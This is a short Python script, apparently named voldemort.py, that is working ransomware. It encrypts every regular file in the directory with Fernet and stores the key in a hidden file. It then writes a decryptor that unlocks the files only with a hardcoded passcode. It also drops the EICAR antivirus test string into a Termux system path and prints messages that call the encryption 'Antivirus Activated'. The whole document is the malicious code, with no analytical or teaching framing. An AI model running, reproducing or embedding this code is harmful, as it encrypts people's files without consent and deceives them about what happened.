#!/bin/env python3

import os

from cryptography.fernet import Fernet

from time import *

files = []

code = """#!/bin/env python3

import os

from cryptography.fernet import Fernet

from colorama import Fore

from datetime import *

# Variables

files = []

name = "VosCop Virus"

time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

forma = f"{Fore.BLUE}[{time}] {name} : "

# Varibles End

for file in os.listdir():

     if file == "runtest" or file == "voldemort.py" or file == ".key.key" or file == "decryptor.py":

                continue

     if os.path.isfile(file):

                files.append(file)

print(files)

with open(".key.key", "rb") as key:

        secretkey = key.read()

passcode = input(forma + f"{Fore.MAGENTA}Passcode To Decrypt :{Fore.RESET} ")

if passcode == "s3cr3tk3y" or passcode == "d3vlop":

        for file in files:

                with open(file, "rb") as thefile:

                        contents = thefile.read()

                contents_dec = Fernet(secretkey).decrypt(contents)

                with open(file, "wb") as thefile:

                        thefile.write(contents_dec)

else:

        print("Wrong Key!, Please Try Again!")

        exit()

os.unlink(".key.key")

print(f"{Fore.RED}Antivirus Deactivated!{Fore.RESET}")

"""

AVfile = """

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

"""

AVloc = "/data/data/com.termux/files/usr/etc/eicar-com.txt"

def make_exec(path):

    mode = os.stat(path).st_mode

    mode |= (mode & 0o444) >> 2    # copy R bits to X

    os.chmod(path, mode)

for file in os.listdir():

     if file == "voldemort.py" or file == "runtest" or file == ".key.key" or file == "decryptor.py":

                continue

     if os.path.isfile(file):

                files.append(file)

print(files)

key = Fernet.generate_key()

with open(".key.key", "wb") as thekey:

        thekey.write(key)

for file in files:

        with open(file, "rb") as thefile:

                contents = thefile.read()

        contents_eny = Fernet(key).encrypt(contents)

        with open(file, "wb") as thefile:

                thefile.write(contents_eny)

sleep(1)

with open(AVloc, "w") as AV:

        AV.write(AVfile)

with open("decryptor.py", "w") as codefile:

        codefile.write(code)

make_exec("decryptor.py")

print("Antivirus Activated!")
